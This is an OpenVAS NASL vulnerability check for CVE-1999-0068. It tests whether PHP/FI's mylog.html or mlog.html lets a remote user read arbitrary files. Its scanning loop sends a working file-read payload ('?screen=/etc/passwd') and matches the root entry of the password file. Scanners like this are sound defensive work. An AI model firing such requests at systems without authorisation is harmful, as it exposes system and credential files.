# OpenVAS Vulnerability Test
# $Id: php_arbitrary_file_access.nasl 3362 2016-05-20 11:19:10Z antu123 $
# Description: PHP mylog.html/mlog.html read arbitrary file
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_solution = "Upgrade to version 3.0 or newer";

tag_summary = "The remote host is running PHP/FI.

The remote version of this software contains a flaw in 
the files mylog.html/mlog.html than can allow a remote attacker 
to view arbitrary files on the remote host.";

# Ref: Bryan Berg on Sun Oct 19 1997.

if(description)
{
 script_id(15708);
 script_version("$Revision: 3362 $");
 script_tag(name:"last_modification", value:"$Date: 2016-05-20 13:19:10 +0200 (Fri, 20 May 2016) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(713);  
 script_cve_id("CVE-1999-0068");
 script_xref(name:"OSVDB", value:"3396");
 script_xref(name:"OSVDB", value:"3397");
 
 name = "PHP mylog.html/mlog.html read arbitrary file";

 script_name(name);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 summary = "Checks PHP mylog.html/mlog.html arbitrary file access";

 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 script_family("Web application abuses");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "solution" , value : tag_solution);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

foreach dir ( make_list(cgi_dirs(), "/php") )
{
	foreach htmlfile (make_list("/mylog.html", "/mlog.html"))
	{
	  req = http_get(port:port, item:dir + htmlfile + "?screen=/etc/passwd");
 	  res = http_keepalive_send_recv(port:port, data:req);
 	  if ( res == NULL ) 
		exit(0);
 	  if ( egrep( pattern:"root:.*:0:[01]:.*", string:res) )
	  {
	 	security_message(port);
	 	exit(0);
	  }
	 }
}
